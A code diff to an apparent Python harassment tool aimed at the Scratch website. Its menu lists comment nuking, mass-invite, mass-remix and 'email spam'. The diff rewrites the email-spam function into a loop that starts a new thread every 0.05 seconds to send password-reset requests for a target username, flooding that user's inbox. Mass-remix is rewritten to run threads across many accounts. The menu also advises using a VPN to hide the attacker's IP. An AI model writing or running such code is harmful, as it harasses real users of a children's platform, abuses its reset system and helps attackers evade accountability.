@@ -215,56 +215,23 @@ def delete_comment():
     init()
 
 def email_spam():
-    threads = int(input("how many threads? (keep it low unless u have a very good pc) "))
     username = input("target: (username) ")
     print("ctrl+c to stop")
-    from selenium.webdriver.common.by import By
-    from selenium import webdriver
-    from selenium.webdriver.chrome.options import Options
-    from selenium.webdriver.support import expected_conditions
-    from selenium.webdriver.support.ui import WebDriverWait
-    from selenium.webdriver.support.ui import Select
-    from selenium.webdriver.common.proxy import Proxy, ProxyType
+    cookies = {'permissions': '%7B%7D','scratchcsrftoken': 'a',}
+    headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8','accept-language': 'en-GB,en-US;q=0.9,en;q=0.8','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://scratch.mit.edu','priority': 'u=0, i','referer': 'https://scratch.mit.edu/accounts/password_reset/','sec-ch-ua': '"Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','sec-gpc': '1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',}
+    data = {'csrfmiddlewaretoken': 'a','username': username,'email': '',}
 
-    options = Options()
-    options.add_argument("--headless")
-    options.add_argument("--window-size=1920,1080")
-    options.add_argument(f'--user-agent=Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36')
-    options.add_argument('--no-sandbox')
-    options.add_argument("--disable-extensions")
-
-    event = threading.Event()
-    event.set()
-
-    def new(name: str, event: threading.Event):
-        test_driver = webdriver.Chrome(options=options)
-        while event.is_set():
-            test_driver.get('https://scratch.mit.edu/accounts/password_reset/')
-            WebDriverWait(test_driver, 10).until(
-                expected_conditions.presence_of_element_located((By.ID, "id_username"))
-            )
-            input_element = test_driver.find_element(By.ID, "id_username")
-            input_element.send_keys(name)
-            button = WebDriverWait(test_driver, 10).until(
-                    expected_conditions.element_to_be_clickable((By.CLASS_NAME, "input-col-start"))
-                )
-            button.click()
-            WebDriverWait(test_driver, 10).until(
-                expected_conditions.url_to_be("https://scratch.mit.edu/accounts/password_reset_done/")
-            )
-        test_driver.quit()
-    
-    for i in range(1, threads+1):
-        global_threads.append(threading.Thread(target=new, args=(username, event)))
-        global_threads[len(global_threads)-1].start()
+    def t():
+        response = requests.post('https://scratch.mit.edu/accounts/password_reset/', cookies=cookies, headers=headers, data=data)
+        print(response.status_code)
 
     try:
         while 1:
-            time.sleep(0.1)
+            threading.Thread(target=t).start()
+            time.sleep(0.05)
     except KeyboardInterrupt:
-        event.clear()
-        for i in global_threads:
-            i.join()
+        print("\nstopping\nstopping\nstopping\nstopping\nstopping")
+        time.sleep(2)
         init()
 
 def mass_invite():
@@ -282,11 +249,19 @@ def mass_remix():
     studio_id = input("project id to remix: ")
     limit = input("how many times? (per account) ")
     optional_name = input("name? (optional) ")
+    threads = []
     for session in sessions:
         try:
-            threading.Thread(target=session.remix, args=(str(studio_id),int(limit), optional_name)).start()
+            threads.append(threading.Thread(target=session.remix, args=(str(studio_id),int(limit), optional_name)))
         except:
             pass
+    for thread in threads:
+        thread.start()
+
+    for thread in threads:
+        thread.join()
+    time.sleep(8)
+    init()
 
 
 def bypass():
@@ -374,7 +349,7 @@ main features:
 2: mass report (not added yet)
 3: nuke studio's comments
 4: delete a comment
-5: email spam (LEAKS UR IP, USE VPN!!!) (set up selenium first cuz im stupid)
+5: email spam (LEAKS UR IP, USE VPN!!!)
 6: mass-invite
 7: mass-remix
 
